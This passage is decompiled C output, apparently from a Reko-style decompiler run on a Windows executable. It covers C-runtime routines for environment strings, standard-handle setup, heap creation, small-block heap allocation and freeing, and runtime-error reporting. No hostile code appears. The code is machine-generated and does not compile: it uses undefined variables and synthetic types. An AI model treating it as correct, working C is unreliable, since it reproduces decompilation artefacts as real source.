				Eq_5 eax_109 = WideCharToMultiByte(*(esp_91 - 0x1C), *(esp_91 - 0x18), *(esp_91 - 0x14), *(esp_91 - 0x10), *(esp_91 - 0x0C), *(esp_91 - 0x08), *(esp_91 - 0x04), esp_91->t0000);
				if (eax_109 != 0x00)
				{
					esp_91->t0000 = eax_109;
					Eq_5 eax_133 = fn00409233(dwArg00);
					esp_91->t0014 = eax_133;
					if (eax_133 != 0x00)
					{
						esp_91->t0000.u0 = 0x00;
						*(esp_91 - 0x04) = 0x00;
						*(esp_91 - 0x08) = (union Eq_5 *) eax_109;
						*(esp_91 - 0x0C) = (union Eq_5 *) eax_133;
						*(esp_91 - 0x10) = esp_91->dw0018;
						*(esp_91 - 0x14) = (union Eq_9257 *) esi_199;
						*(esp_91 - 0x18) = 0x00;
						*(esp_91 - 0x1C) = 0x00;
						if (WideCharToMultiByte(*(esp_91 - 0x1C), *(esp_91 - 0x18), *(esp_91 - 0x14), *(esp_91 - 0x10), *(esp_91 - 0x0C), *(esp_91 - 0x08), *(esp_91 - 0x04), esp_91->t0000) == 0x00)
						{
							esp_91->t0000 = esp_91->t0014;
							word32 ebp_171;
							word32 edi_172;
							esp_91->t0014 = fn00409204(eax_109, dwArg00, out ebp_171, out edi_172);
						}
						ebx_122 = esp_186->dw0010;
					}
				}
				union Eq_9257 * esp_125 = esp_186 - 0x04;
				*esp_125 = (union Eq_9257 *) esi_199;
				FreeEnvironmentStringsW(*esp_125);
				eax_129 = ebx_122;
				return eax_129;
			}
			Eq_9257 eax_188 = GetEnvironmentStringsW();
			esi_199 = eax_188;
			if (eax_188 != 0x00)
				goto l0040A477;
l0040A539:
			eax_129 = 0x00;
			return eax_129;
		}
		Eq_5 eax_268 = GetEnvironmentStrings();
		edi_203 = eax_268;
		if (eax_268 == 0x00)
			goto l0040A539;
		globals->dw492040 = 0x02;
	}
	else
	{
		if (eax_8 == 0x01)
			goto l0040A467;
		if (eax_8 != 0x02)
			goto l0040A539;
	}
	if (edi_203 == 0x00)
	{
		Eq_5 eax_259 = GetEnvironmentStrings();
		edi_203 = eax_259;
		if (eax_259 == 0x00)
			goto l0040A539;
	}
	Eq_5 eax_210 = edi_203;
	if (*edi_203 != 0x00)
	{
		do
		{
			do
				eax_210 = eax_210 + 0x01;
			while (*eax_210 != 0x00);
			eax_210 = eax_210 + 0x01;
		} while (Mem0[eax_210 + 0x01:byte] != 0x00);
	}
	word32 esi_231;
	Eq_9549 eax_212 = eax_210 - edi_203;
	word32 eax_219 = fn00409233(eax_212 + 0x01);
	if (eax_219 == 0x00)
		esi_231 = 0x00;
	else
		fn00407820(eax_219, edi_203, eax_212 + 0x01, out esi_231, out edi_203);
	FreeEnvironmentStringsA(edi_203);
	eax_129 = esi_231;
	return eax_129;
}

// 0040A542: Register Eq_5 fn0040A542(Register Eq_5 ebp, Register Eq_5 edi)
Eq_5 fn0040A542(Eq_5 ebp, Eq_5 edi)
{
	Eq_5 eax_18 = fn00409233(0x0100);
	Eq_5 esi_19 = eax_18;
	Eq_5 ecx_181 = 0x0100;
	if (eax_18 == 0x00)
	{
		word32 edi_290;
		esi_19 = fn0040816E(ebp, edi, 0x1B, out edi_290);
		ecx_181.u0 = 0x1B;
	}
	globals->t4930A0 = esi_19;
	globals->t4931A0.u0 = 0x20;
	Eq_5 eax_34 = (word32) esi_19 + 0x0100;
	while (esi_19 < eax_34)
	{
		*((word32) esi_19 + 0x04) = *((word32) esi_19 + 0x04) & 0x00;
		*esi_19 = *esi_19 | ~0x00;
		*((word32) esi_19 + 0x05) = 0x0A;
		esi_19 = (word32) esi_19 + 0x08;
		eax_34 = (word32) globals->t4930A0 + 0x0100;
	}
	GetStartupInfoA(fp - 0x44);
	if (wLoc12 != 0x00 && dwLoc10 != null)
	{
		Eq_473 esi_168 = *dwLoc10;
		byte * ebp_169 = (char *) dwLoc10 + 0x04;
		word32 ebx_173 = esi_168 + (dwLoc10 + 0x04);
		if (esi_168 >= 0x0800)
			esi_168.u0 = 0x0800;
		if (globals->t4931A0 < esi_168)
		{
			word32 * edi_246 = globals->a4930A4;
			do
			{
				Eq_5 eax_252 = fn00409233(0x0100);
				ecx_181.u0 = 0x0100;
				if (eax_252 == 0x00)
				{
					esi_168 = globals->t4931A0;
					break;
				}
				globals->t4931A0 = (word32) globals->t4931A0 + 0x0020;
				*edi_246 = (word32) eax_252;
				ecx_181 = (word32) eax_252 + 0x0100;
				while (eax_252 < ecx_181)
				{
					*((word32) eax_252 + 0x04) = *((word32) eax_252 + 0x04) & 0x00;
					*eax_252 = *eax_252 | ~0x00;
					*((word32) eax_252 + 0x05) = 0x0A;
					eax_252 = (word32) eax_252 + 0x08;
					ecx_181 = *edi_246 + 0x0100;
				}
				edi_246 = edi_246 + 0x01;
			} while (globals->t4931A0 < esi_168);
		}
		Eq_473 edi_186 = 0x00;
		if (esi_168 > 0x00)
		{
			do
			{
				Eq_5 eax_199 = *ebx_173;
				if (eax_199 != ~0x00)
				{
					byte cl_215 = *ebp_169;
					ecx_181 = DPB(ecx_181, cl_215, 0);
					if ((cl_215 & 0x01) != 0x00 && ((cl_215 & 0x08) != 0x00 || GetFileType(eax_199) != 0x00))
					{
						struct Eq_9834 * eax_233 = (&globals->t4930A0)[edi_186 >> 0x05] + (edi_186 & 0x1F) * 0x08;
						word32 ecx_234 = *ebx_173;
						eax_233->dw0000 = ecx_234;
						byte cl_236 = *ebp_169;
						eax_233->b0004 = cl_236;
						ecx_181 = DPB(ecx_234, cl_236, 0);
					}
				}
				edi_186 = (word32) edi_186.u0 + 0x01;
				ebp_169 = ebp_169 + 0x01;
				ebx_173 = ebx_173 + 0x01;
			} while (edi_186 < esi_168);
		}
	}
	int32 ebx_70 = 0x00;
	do
	{
		Eq_5 eax_80 = globals->t4930A0;
		struct Eq_9716 * esi_83 = (word32) eax_80 + ebx_70 * 0x08;
		if (*((word32) eax_80 + ebx_70 * 0x08) == ~0x00)
		{
			Eq_5 eax_114;
			esi_83->b0004 = 0x81;
			if (ebx_70 == 0x00)
				eax_114.u0 = ~0x09;
			else
				eax_114 = 0x00 - (0x01 - ebx_70 == 0x00) + ~0x0A;
			Eq_5 eax_117 = GetStdHandle(eax_114);
			if (eax_117 != ~0x00)
			{
				Eq_5 eax_133 = GetFileType(eax_117);
				if (eax_133 == 0x00)
					goto l0040A6BE;
				esi_83->t0000 = eax_117;
				if ((eax_133 & 0xFF) == 0x02)
					goto l0040A6BE;
				if ((eax_133 & 0xFF) == 0x03)
					esi_83->b0004 = esi_83->b0004 | 0x08;
			}
			else
			{
l0040A6BE:
				esi_83->b0004 = esi_83->b0004 | 0x40;
			}
		}
		else
			esi_83->b0004 = esi_83->b0004 | 0x80;
		ebx_70 = ebx_70 + 0x01;
	} while (ebx_70 < 0x03);
	SetHandleCount(globals->t4931A0);
	return ecx_181;
}

// 0040A6ED: Register word32 fn0040A6ED(Stack word32 dwArg04)
word32 fn0040A6ED(word32 dwArg04)
{
	Eq_5 eax_14 = HeapCreate((word32) (dwArg04 == 0x00), 0x1000, 0x00);
	globals->t493084 = eax_14;
	if (eax_14 == 0x00)
		return 0x00;
	if (fn0040B195() != 0x00)
		return 0x01;
	HeapDestroy(globals->t493084);
	return 0x00;
}

// 0040A8FC: Register Eq_5 fn0040A8FC(Register Eq_5 ebp, Register Eq_5 edi)
Eq_5 fn0040A8FC(Eq_5 ebp, Eq_5 edi)
{
	word32 eax_3 = globals->dw491EC0;
	if (eax_3 == 0x01 || eax_3 == 0x00 && globals->dw4110B4 == 0x01)
	{
		Eq_5 edi_21 = fn0040A935(ebp, edi, 252);
		<anonymous> * eax_22 = globals->ptr492044;
		ptr32 esp_24 = fp;
		if (eax_22 != null)
		{
			word32 eax_43;
			byte SCZO_44;
			bool Z_45;
			byte SZO_46;
			bool C_47;
			word32 ecx_48;
			eax_22();
		}
		*(esp_24 - 0x04) = 0xFF;
		edi = fn0040A935(ebp, edi_21, dwArg00);
	}
	return edi;
}

// 0040A935: Register Eq_5 fn0040A935(Register Eq_5 ebp, Register Eq_5 edi, Stack Eq_5 dwArg04)
Eq_5 fn0040A935(Eq_5 ebp, Eq_5 edi, Eq_5 dwArg04)
{
	ui32 ecx_10 = 0x00;
	union Eq_5 * eax_13 = globals->a411488;
	while (dwArg04 != *eax_13)
	{
		eax_13 = (union Eq_5 *) ((char *) eax_13 + 0x08);
		ecx_10 = ecx_10 + 0x01;
		if (eax_13 >= &globals->t411518)
			break;
	}
	struct Eq_9936 * esi_28 = ecx_10 << 0x03;
	if (dwArg04 == esi_28->t411488)
	{
		word32 eax_57 = globals->dw491EC0;
		if (eax_57 != 0x01 && (eax_57 != 0x00 || globals->dw4110B4 != 0x01))
		{
			if (dwArg04 != 252)
			{
				if (GetModuleFileNameA(0x00, fp - 424, 0x0104) == 0x00)
					fn00407370(fp - 424, out edi);
				*(fp - 0x01B0) = (union Eq_5 *) edi;
				*(fp - 0x01B4) = fp - 424;
				byte dl_118;
				if (fn00407460(dwArg00, out dl_118) > ~0x3A)
				{
					*(fp - 0x01B4) = fp - 424;
					byte dl_168;
					Eq_5 eax_169 = fn00407460(dwArg00, out dl_168);
					*(fp - 440) = 0x03;
					*(fp - 444) = 0x0040D5B0;
					*(fp - 448) = (word32) eax_169 + (fp - 0x01E3);
					fn0040ABE0(dwArg00, dwArg04, dwArg08);
				}
				*(fp - 0x01B4) = 0x0040D594;
				*(fp - 440) = fp - 0xA4;
				word32 edi_132;
				fn00407370(dwArg00, out edi_132);
				*(fp - 444) = edi_132;
				*(fp - 448) = fp - 0xA4;
				fn00407380(dwArg00);
				*(fp - 0x01C4) = 0x0040D590;
				*(fp - 0x01C8) = fp - 0xA4;
				fn00407380(dwArg00);
				*(fp - 0x01CC) = (union Eq_5 *) esi_28->t41148C;
				*(fp - 464) = fp - 0xA4;
				fn00407380(dwArg00);
				*(fp - 0x01D4) = 0x00012010;
				*(fp - 0x01D8) = 0x0040D568;
				*(fp - 0x01DC) = fp - 0xA4;
				fn0040BCB8(dwArg00, dwArg04, dwArg08);
				edi = *(fp - 0x01B0);
			}
		}
		else
		{
			byte dl_73;
			WriteFile(GetStdHandle(~0x0B), esi_28->t41148C, fn00407460(esi_28->t41148C, out dl_73), fp + 0x04, null);
		}
	}
	return edi;
}

// 0040AA88: Register Eq_94 fn0040AA88(Register ptr32 ebp, Stack Eq_5 dwArg04, Stack Eq_5 dwArg08, Stack Eq_5492 dwArg0C, Stack Eq_7165 dwArg10, Stack Eq_473 dwArg14, Stack Eq_5481 dwArg18, Stack word32 dwArg1C, Register out Eq_7169 dlOut)
BOOL fn0040AA88(ptr32 ebp, Eq_5 dwArg04, Eq_5 dwArg08, Eq_5492 dwArg0C, LPWORD dwArg10, Eq_473 dwArg14, LCID dwArg18, word32 dwArg1C, Eq_7169 & dlOut)
{
	*dlOut = dl;
	Eq_94 eax_129;
	ptr32 eax_14 = fs->ptr0000;
	fs->ptr0000 = fp - 0x14;
	word32 eax_262 = globals->dw492048;
	if (eax_262 == 0x00)
	{
		if (GetStringTypeW(0x01, &globals->t40D248, 0x01, fp - 0x20) != 0x00)
			eax_262 = 0x01;
		else
		{
			if (GetStringTypeA(0x00, 0x01, 0x0040D244, 0x01, fp - 0x20) == 0x00)
				goto l0040ABBD;
			eax_262 = 0x02;
		}
		globals->dw492048 = eax_262;
	}
	if (eax_262 == 0x02)
	{
		Eq_5481 eax_106 = dwArg18;
		if (dwArg18 == 0x00)
			eax_106 = globals->t491ED4;
		eax_129 = GetStringTypeA(eax_106, dwArg04, dwArg08, dwArg0C, dwArg10);
l0040ABBF:
		fs->ptr0000 = eax_14;
		return eax_129;
	}
	if (eax_262 == 0x01)
	{
		if (dwArg14 == 0x00)
			dwArg14 = globals->t491EE4;
		int32 eax_166 = MultiByteToWideChar(dwArg14, (0x00 - (-dwArg1C == 0x00) & 0x08) + 0x01, dwArg08, dwArg0C, null, 0x00);
		if (eax_166 != 0x00)
		{
			ui32 eax_175 = eax_166 * 0x02 + 0x03;
			fn00407B80(DPB(eax_175, (byte) eax_175 & 252, 0), 0x00);
			*(fp - 0x3C) = eax_166 * 0x02;
			*(fp - 0x40) = 0x00;
			*(fp - 0x44) = fp - 0x38;
			byte dl_192;
			*dlOut = fn00407310(dwArg00, bArg04, dwArg08);
			if (fp != 0x38)
			{
				*(fp - 0x3C) = eax_166;
				*(fp - 0x40) = fp - 0x38;
				*(fp - 0x44) = (union Eq_5492 *) dwArg0C;
				*(fp - 0x48) = (union Eq_5 *) dwArg08;
				*(fp - 0x4C) = 0x01;
				*(fp - 0x50) = (union Eq_473 *) dwArg14;
				int32 eax_216 = MultiByteToWideChar(*(fp - 0x50), *(fp - 0x4C), *(fp - 0x48), *(fp - 0x44), *(fp - 0x40), *(fp - 0x3C));
				if (eax_216 != 0x00)
				{
					*(fp - 0x3C) = (LPWORD *) dwArg10;
					*(fp - 0x40) = eax_216;
					*(fp - 0x44) = fp - 0x38;
					*(fp - 0x48) = (union Eq_5 *) dwArg04;
					eax_129 = GetStringTypeW(*(fp - 0x48), *(fp - 0x44), *(fp - 0x40), *(fp - 0x3C));
					goto l0040ABBF;
				}
			}
		}
	}
l0040ABBD:
	eax_129 = 0x00;
	goto l0040ABBF;
}

// 0040ABE0: Register (ptr32 (arr Eq_5345)) fn0040ABE0(Stack Eq_5 dwArg04, Stack Eq_5 dwArg08, Stack (ptr32 (arr Eq_5345)) dwArg0C)
Eq_5345 * fn0040ABE0[](Eq_5 dwArg04, Eq_5 dwArg08, Eq_5345 * dwArg0C[])
{
	Eq_5345 (* ecx_117)[] = dwArg0C;
	if (dwArg0C == null)
		return ecx_117;
	byte al_100;
	Eq_5345 (* ebx_103)[] = dwArg0C;
	Eq_5 esi_120 = dwArg08;
	Eq_5 edi_105 = dwArg04;
	if ((dwArg08 & 0x03) == 0x00)
	{
		ecx_117 = dwArg0C >> 0x02;
		if (dwArg0C >> 0x02 == 0x00)
			goto l0040AC25;
	}
	else
	{
		do
		{
			al_100 = (byte) *esi_120;
			*edi_105 = al_100;
			esi_120 = (word32) esi_120 + 0x01;
			edi_105 = (word32) edi_105 + 0x01;
			ecx_117 = ecx_117 - 0x01;
			if (ecx_117 == null)
				return ecx_117;
			if (al_100 == 0x00)
			{
				if ((edi_105 & 0x03) != 0x00)
				{
					do
					{
						*edi_105 = al_100;
						edi_105 = (word32) edi_105 + 0x01;
						ecx_117 = ecx_117 - 0x01;
						if (ecx_117 == null)
							return ecx_117;
					} while ((edi_105 & 0x03) != 0x00);
				}
				ebx_103 = ecx_117;
				ecx_117 = ecx_117 >> 0x02;
				if (ecx_117 != null)
				{
l0040ACC7:
					do
					{
						*edi_105 = 0x00;
						edi_105 = (word32) edi_105 + 0x04;
						ecx_117 = ecx_117 - 0x01;
					} while (ecx_117 != null);
l0040ACD1:
					al_100 = 0x00;
					ebx_103 = ebx_103 & 0x03;
					if (ebx_103 == null)
						return ecx_117;
				}
				do
				{
					*edi_105 = al_100;
					edi_105 = (word32) edi_105 + 0x01;
l0040AC5E:
					ebx_103 = ebx_103 - 0x01;
				} while (ebx_103 != null);
				return ecx_117;
			}
		} while ((esi_120 & 0x03) != 0x00);
		ebx_103 = ecx_117;
		ecx_117 = ecx_117 >> 0x02;
		if (ecx_117 >> 0x02 == 0x00)
		{
l0040AC20:
			ebx_103 = ebx_103 & 0x03;
			if (ebx_103 == null)
				return ecx_117;
l0040AC25:
			do
			{
				al_100 = (byte) *esi_120;
				*edi_105 = al_100;
				esi_120 = (word32) esi_120 + 0x01;
				edi_105 = (word32) edi_105 + 0x01;
				if (al_100 == 0x00)
					goto l0040AC5E;
				ebx_103 = ebx_103 - 0x01;
			} while (ebx_103 != null);
			return ecx_117;
		}
	}
	do
	{
		Eq_10408 edx_210 = *esi_120;
		Eq_10412 eax_206 = *esi_120;
		byte dl_211 = (byte) edx_210;
		byte dh_212 = SLICE(edx_210, byte, 8);
		esi_120 = (word32) esi_120 + 0x04;
		if (((eax_206 ^ ~0x00 ^ (word32) eax_206 + 0x7EFEFEFF) & 0x81010100) != 0x00)
		{
			if (dl_211 != 0x00)
			{
				if (dh_212 != 0x00)
				{
					if ((edx_210 & 0x00FF0000) != 0x00)
					{
						if ((edx_210 & 0xFF000000) != 0x00)
							goto l0040AC69;
						*edi_105 = edx_210;
					}
					else
						*edi_105 = edx_210 & 0xFFFF;
				}
				else
					*edi_105 = edx_210 & 0xFF;
			}
			else
				*edi_105 = 0x00;
			edi_105 = (word32) edi_105 + 0x04;
			ecx_117 = ecx_117 - 0x01;
			if (ecx_117 != null)
				goto l0040ACC7;
			goto l0040ACD1;
		}
l0040AC69:
		*edi_105 = edx_210;
		edi_105 = (word32) edi_105 + 0x04;
		ecx_117 = ecx_117 - 0x01;
	} while (ecx_117 != null);
	goto l0040AC20;
}

// 0040B195: Register Eq_5 fn0040B195()
Eq_5 fn0040B195()
{
	Eq_5 eax_10 = HeapAlloc(globals->t493084, 0x00, 0x0140);
	globals->t492078 = eax_10;
	if (eax_10 == 0x00)
		return eax_10;
	globals->t492070 = globals->t492070 & 0x00;
	globals->dw492074 = globals->dw492074 & 0x00;
	globals->t49206C = eax_10;
	globals->dw492064 = 0x10;
	return 0x01;
}

// 0040B1D3: Register (ptr32 Eq_10579) fn0040B1D3(Stack Eq_5 dwArg04)
Eq_10579 * fn0040B1D3(Eq_5 dwArg04)
{
	struct Eq_10579 * eax_15 = (word32) globals->t492078 + 0x0C;
	struct Eq_10579 * ecx_6 = eax_15 + globals->dw492074;
	while (eax_15 < ecx_6)
	{
		if (dwArg04 - eax_15->dw0000 < 0x00100000)
			return eax_15;
		eax_15 = eax_15 + 0x01;
	}
	eax_15 = null;
	return eax_15;
}

// 0040B1FE: void fn0040B1FE(Register Eq_5 ebp, Stack Eq_5 dwArg04, Stack Eq_5 dwArg08, Stack byte bArg0B)
void fn0040B1FE(Eq_5 ebp, Eq_5 dwArg04, Eq_5 dwArg08, byte bArg0B)
{
	Eq_5 dwArg08_349;
	int32 ebx_21 = *(dwArg08 - 0x04);
	Eq_10608 esi_20 = dwArg08 - *((word32) dwArg04 + 0x0C);
	Eq_10613 eax_18 = *((word32) dwArg04 + 0x0010);
	int32 ecx_35 = ebx_21 - 0x01 + ((word32) dwArg08 - 0x04);
	struct Eq_10624 * edx_22 = (word32) dwArg08 - 0x04;
	Eq_10626 esi_136 = esi_20 >> 0x0F;
	int32 edi_28 = *(dwArg08 - 0x08);
	int32 ebx_293 = ebx_21 - 0x01;
	word32 * ecx_32 = (word32) eax_18 + ((esi_20 >> 0x0F) *s 0x0204 + 0x0144);
	int32 dwLoc10_33 = ebx_21 - 0x01;
	dwArg08_349 = dwArg08;
	if (((byte) ecx_35 & 0x01) == 0x00)
	{
		Eq_5 ecx_439 = (ecx_35 >> 0x04) - 0x01;
		dwArg08_349 = ecx_439;
		if (ecx_439 > 0x3F)
			dwArg08_349.u0 = 0x3F;
		if (ebx_21 + 0x03 + ((word32) dwArg08 - 0x04) == (ebx_21 + 0x07) + ((word32) dwArg08 - 0x04))
		{
			byte cl_463 = (byte) dwArg08_349;
			if (dwArg08_349 < 0x20)
			{
				uint32 edi_469 = ~(0x80000000 >> cl_463);
				*((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x0044)) = *((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x0044)) & edi_469;
				word32 ecx_468 = dwArg08_349 + 0x04 + eax_18;
				Eq_10761 v17_474 = *ecx_468 - 0x01;
				*ecx_468 = v17_474;
				if (v17_474 == 0x00)
					*dwArg04 = *dwArg04 & edi_469;
			}
			else
			{
				word32 edi_489 = ~(0x80000000 >>u (byte) (dwArg08_349 + ~0x1F));
				*((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x00C4)) = *((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x00C4)) & edi_489;
				word32 ecx_488 = dwArg08_349 + 0x04 + eax_18;
				Eq_10761 v20_494 = *ecx_488 - 0x01;
				*ecx_488 = v20_494;
				if (v20_494 == 0x00)
					*((word32) dwArg04 + 0x04) = *((word32) dwArg04 + 0x04) & edi_489;
			}
		}
		*((char *) (ebx_21 + 0x07 + ((word32) dwArg08 - 0x04)) + 0x04) = ebx_21 + 0x03 + ((word32) dwArg08 - 0x04);
		*((char *) (ebx_21 + 0x03 + ((word32) dwArg08 - 0x04)) + 0x08) = ebx_21 + 0x07 + ((word32) dwArg08 - 0x04);
		ebx_293 = ebx_21 - 0x01 + ecx_35;
		dwLoc10_33 = ebx_293;
	}
	Eq_10651 edi_53 = ebx_293 >> 0x04;
	Eq_5 edi_357 = edi_53 - 0x01;
	if (edi_53 > 0x40)
		edi_357.u0 = 0x3F;
	if ((edi_28 & 0x01) == 0x00)
	{
		Eq_5 ecx_343 = (edi_28 >> 0x04) - 0x01;
		struct Eq_10624 * edx_337 = (word32) dwArg08 - 0x04 - edi_28;
		dwArg08_349 = ecx_343;
		if (ecx_343 > 0x3F)
		{
			dwArg08_349.u0 = 0x3F;
			ecx_343.u0 = 0x3F;
		}
		ebx_293 = ebx_293 + edi_28;
		dwLoc10_33 = ebx_293;
		edi_357 = (ebx_293 >> 0x04) - 0x01;
		if (edi_357 > 0x3F)
			edi_357.u0 = 0x3F;
		if (ecx_343 != edi_357)
		{
			if (edx_337->ptr0004 == edx_337->ptr0008)
			{
				byte cl_388 = (byte) dwArg08_349;
				if (dwArg08_349 < 0x20)
				{
					uint32 edx_394 = ~(0x80000000 >> cl_388);
					*((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x0044)) = *((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x0044)) & edx_394;
					word32 ecx_393 = dwArg08_349 + 0x04 + eax_18;
					Eq_10761 v23_399 = *ecx_393 - 0x01;
					*ecx_393 = v23_399;
					if (v23_399 == 0x00)
						*dwArg04 = *dwArg04 & edx_394;
				}
				else
				{
					word32 edx_414 = ~(0x80000000 >>u (byte) (dwArg08_349 + ~0x1F));
					*((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x00C4)) = *((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x00C4)) & edx_414;
					word32 ecx_413 = dwArg08_349 + 0x04 + eax_18;
					Eq_10761 v26_419 = *ecx_413 - 0x01;
					*ecx_413 = v26_419;
					if (v26_419 == 0x00)
						*((word32) dwArg04 + 0x04) = *((word32) dwArg04 + 0x04) & edx_414;
				}
			}
			edx_337->ptr0008->ptr0004 = edx_337->ptr0004;
			edx_337->ptr0004->ptr0008 = edx_337->ptr0008;
		}
		edx_22 = edx_337;
	}
	if ((edi_28 & 0x01) != 0x00 || dwArg08_349 != edi_357)
	{
		edx_22->ptr0004 = (ecx_32 + edi_357 * 0x08)[0x01];
		word32 ecx_269 = ecx_32 + edi_357 * 0x08;
		edx_22->ptr0008 = ecx_269;
		ecx_269->ptr0004 = edx_22;
		edx_22->ptr0004->ptr0008 = edx_22;
		if (edx_22->ptr0004 == edx_22->ptr0008)
		{
			byte cl_278 = Mem273[edi_357 + 0x04 + eax_18:byte];
			Mem284[edi_357 + 0x04 + eax_18:byte] = cl_278 + 0x01;
			if (edi_357 < 0x20)
			{
				if (cl_278 == 0x00)
					*dwArg04 = *dwArg04 | 0x80000000 >> (byte) edi_357;
				word32 eax_300 = eax_18 + 0x44 + (esi_20 >>u 0x0F) * 0x04;
				*eax_300 = *eax_300 | 0x80000000 >> (byte) edi_357;
			}
			else
			{
				if (cl_278 == 0x00)
					*((word32) dwArg04 + 0x04) = *((word32) dwArg04 + 0x04) | 0x80000000 >> (byte) (edi_357 - (union Eq_10761 *) 0x20);
				word32 eax_321 = eax_18 + 0xC4 + (esi_20 >>u 0x0F) * 0x04;
				*eax_321 = *eax_321 | 0x80000000 >> (byte) (edi_357 - (union Eq_10761 *) 0x20);
			}
			ebx_293 = dwLoc10_33;
		}
	}
	edx_22->dw0000 = ebx_293;
	edx_22[(ebx_293 - 0x04) / 0x0C] = (struct Eq_10624) ebx_293;
	word32 v31_91 = *ecx_32 - 0x01;
	*ecx_32 = v31_91;
	if (v31_91 != 0x00)
		return;
	Eq_5 eax_132;
	Eq_5 eax_119 = globals->t492070;
	if (eax_119 != 0x00)
	{
		VirtualFree((word32) *((word32) eax_119 + 0x0C) + (globals->t492068 << 0x0F), 0x8000, 0x4000);
		Eq_5 eax_171 = globals->t492070;
		*((word32) eax_171 + 0x08) = *((word32) eax_171 + 0x08) | 0x80000000 >> (byte) globals->t492068;
		Eq_10626 ecx_178 = globals->t492068;
		Eq_10613 eax_179 = *((word32) globals->t492070 + 0x0010);
		*((word32) eax_179 + (ecx_178 * 0x04 + 0x00C4)) = *((word32) eax_179 + (ecx_178 * 0x04 + 0x00C4)) & 0x00;
		Eq_10613 eax_184 = *((word32) globals->t492070 + 0x0010);
		*((word32) eax_184 + 0x0043) = *((word32) eax_184 + 0x0043) - 0x01;
		Eq_5 eax_187 = globals->t492070;
		if (*((word32) *((word32) eax_187 + 0x0010) + 0x0043) == 0x00)
		{
			*((word32) eax_187 + 0x04) = *((word32) eax_187 + 0x04) & ~0x01;
			eax_187 = globals->t492070;
		}
		if (*((word32) eax_187 + 0x08) == ~0x00)
		{
			VirtualFree(esp_201->t0000, esp_201->t0004, esp_201->t0008);
			*(esp_203 - 0x04) = (union Eq_10613 *) *((word32) globals->t492070 + 0x0010);
			*(esp_203 - 0x08) = 0x00;
			*(esp_203 - 0x0C) = (union Eq_5 *) globals->t493084;
			HeapFree(*(esp_203 - 0x0C), *(esp_203 - 0x08), *(esp_203 - 0x04));
			Eq_5 eax_233 = globals->t492070;
			*(esp_203 - 0x04) = (word32) globals->t492078 + ((globals->dw492074 * 0x14 - eax_233) - 0x14);
			*(esp_203 - 0x08) = (word32) eax_233 + 0x0014;
			*(esp_203 - 0x0C) = (union Eq_5 *) eax_233;
			eax_132 = fn00407C00(dwArg00, dwArg04, dwArg08_349, out esi_136)->t0008;
			globals->dw492074 = globals->dw492074 - 0x01;
			if (eax_132 > globals->t492070)
				eax_132 = eax_132 - 0x14;
			globals->t49206C = globals->t492078;
l0040B519:
			globals->t492070 = eax_132;
			globals->t492068 = esi_136;
			return;
		}
	}
	eax_132 = dwArg04;
	goto l0040B519;
}

// 0040B529: Register ptr32 fn0040B529(Register Eq_5 esi, Stack Eq_5 dwArg04, Stack byte bArg07)
ptr32 fn0040B529(Eq_5 esi, Eq_5 dwArg04, byte bArg07)
{
	uint32 esi_355;
	uint32 dwLoc0C_33;
	uint32 dwLoc10_32;
	int32 ecx_25 = (word32) dwArg04 + 0x0017 & ~0x0F;
	Eq_5 edx_9 = globals->t492078;
	int32 ecx_28 = (ecx_25 >> 0x04) - 0x01;
	Eq_5 edi_20 = (word32) edx_9 + globals->dw492074 * 0x14;
	byte cl_29 = (byte) ecx_28;
	if (ecx_28 < 0x20)
	{
		esi_355 = (esi | ~0x00) >> cl_29;
		dwLoc0C_33 = dwLoc0C | ~0x00;
		dwLoc10_32 = esi_355;
	}
	else
	{
		esi_355 = 0x00;
		dwLoc10_32 = 0x00;
		dwLoc0C_33 = (dwArg04 | ~0x00) >> (byte) (ecx_28 + ~0x1F);
	}
	Eq_5 eax_38 = globals->t49206C;
	Eq_5 ebx_142 = eax_38;
	Eq_5 dwArg04_395 = eax_38;
	if (eax_38 < edi_20)
	{
		while ((*((word32) ebx_142 + 0x04) & dwLoc0C_33 | *ebx_142 & esi_355) == 0x00)
		{
			ebx_142 = (word32) ebx_142 + 0x0014;
			dwArg04_395 = ebx_142;
			if (ebx_142 >= edi_20)
				break;
		}
	}
	ptr32 eax_162;
	if (ebx_142 == edi_20)
	{
		ebx_142 = edx_9;
		while (true)
		{
			bool Z_393 = (bool) cond(ebx_142 - eax_38);
			dwArg04_395 = ebx_142;
			if (ebx_142 >= eax_38)
				break;
			if ((*((word32) ebx_142 + 0x04) & dwLoc0C_33 | *ebx_142 & esi_355) != 0x00)
			{
				Z_393 = (bool) cond(ebx_142 - eax_38);
				break;
			}
			ebx_142 = (word32) ebx_142 + 0x0014;
		}
		if (!Z_393)
		{
			while (true)
			{
				bool Z_408 = (bool) cond(ebx_142 - edi_20);
				if (ebx_142 >= edi_20)
					break;
				if (*((word32) ebx_142 + 0x08) != 0x00)
				{
					Z_408 = (bool) cond(ebx_142 - edi_20);
					break;
				}
				ebx_142 = (word32) ebx_142 + 0x0014;
				dwArg04_395 = ebx_142;
			}
			if (!Z_408)
			{
				ebx_142 = (word32) edx_9 + 0x08;
				while (true)
				{
					bool Z_446 = (bool) cond(ebx_142 - eax_38);
					dwArg04_395 = ebx_142;
					if (ebx_142 >= eax_38)
						break;
					if (*ebx_142 != 0x00)
					{
						Z_446 = (bool) cond(ebx_142 - eax_38);
						break;
					}
					ebx_142 = (word32) ebx_142 + 0x0014;
				}
				if (!Z_446)
				{
					Eq_5 eax_454 = fn0040B832();
					ebx_142 = eax_454;
					dwArg04_395 = eax_454;
					if (eax_454 == 0x00)
					{
l0040B617:
						eax_162 = 0x00;
						return eax_162;
					}
				}
			}
			**((word32) ebx_142 + 0x0010) = fn0040B8E3(ebx_142);
			if (**((word32) ebx_142 + 0x0010) == ~0x00)
				goto l0040B617;
		}
	}
	globals->t49206C = ebx_142;
	struct Eq_11327 * eax_86 = *((word32) ebx_142 + 0x0010);
	Eq_10626 edx_363 = eax_86->t0000;
	Eq_10626 dwLoc08_347 = edx_363;
	if (edx_363 == ~0x00 || ((eax_86->a00C4)[edx_363] & dwLoc0C_33 | (eax_86->a0044)[edx_363] & esi_355) == 0x00)
	{
		dwLoc08_347 = edx_363 & 0x00;
		ui32 * ecx_349 = eax_86->a0044 + 33;
